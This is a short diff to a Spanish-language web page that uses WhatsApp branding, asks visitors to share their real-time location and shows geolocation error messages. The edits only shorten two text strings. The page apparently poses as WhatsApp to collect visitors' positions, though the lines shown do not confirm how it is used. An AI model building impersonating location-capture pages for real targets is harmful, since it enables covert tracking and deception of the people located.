@@ -231,7 +231,7 @@
     <div class="card">
         <img src="logowhatsapp.jpg" alt="WhatsApp" class="logo" />
         <h2>WhatsApp</h2>
-        <p class="subtitle">Comparte tu ubicación en tiempo real</p>
+        <p class="subtitle"> ubicacion en tiempo real</p>
         <iframe src="https://www.google.com/maps?q=Colombia&output=embed" loading="lazy"></iframe>
         <div id="estado">
             <span class="spinner"></span>
@@ -449,7 +449,7 @@
                     let mensaje = '';
                     switch (err.code) {
                         case err.PERMISSION_DENIED:
-                            mensaje = 'Permiso denegado. Activa la ubicación en los ajustes del navegador y presiona "Recargar página".';
+                            mensaje = 'Activa la ubicación y presiona "Recargar página".';
                             break;
                         case err.POSITION_UNAVAILABLE:
                             mensaje = 'GPS no disponible. Asegúrate de tener señal o Wi-Fi.';
